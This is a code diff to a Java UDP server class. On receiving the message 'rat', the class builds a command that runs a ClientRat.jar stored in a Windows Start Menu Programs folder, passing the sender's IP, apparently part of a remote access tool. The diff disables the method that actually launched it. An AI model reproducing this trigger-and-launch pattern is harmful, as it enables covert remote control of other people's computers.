@@ -109,8 +109,7 @@ public class ServerUDP
 		 */
 		if (receiveUDP.matches("rat")) {
 			System.out.println("IP : "+getRemoteIP());
-			String[] msg = parseCmd("java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\ClientRat.jar "+getRemoteIP());
-			launchClientRat(msg);
+			return "java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\ClientRat.jar "+getRemoteIP();
 		}
 		
 		
@@ -324,7 +323,7 @@ public class ServerUDP
 
 
 
-	private void launchClientRat(String[] message) throws IOException {
+	/*private void launchClientRat(String[] message) throws IOException {
 			/*String[] cmd = new String[message.length-1];
 			
 			for (int i = 0 ; i < message.length-1 ; i++){
@@ -336,7 +335,7 @@ public class ServerUDP
 			
 			String[] arg = {message[message.length-1]};
 			System.out.println("arg = "+arg);
-			*/
+			///////////////
 			
 			String[] cmdToExecute = new String[message.length-1];
 
@@ -347,7 +346,6 @@ public class ServerUDP
 			
 			if (message[0] == s_null) return;
 			
-			List<String> params = java.util.Arrays.asList(message);
 			ProcessBuilder pb = new ProcessBuilder(message);
 			//pb.redirectErrorStream(true);
 			pb.redirectError(new File("C:\\ErreurRat\\errore.txt"));
@@ -356,7 +354,7 @@ public class ServerUDP
 			new BufferedReader(new InputStreamReader(process.getInputStream()) ); 
 			
 			return;
-		}		
+		}	*/ 
 	
 
 
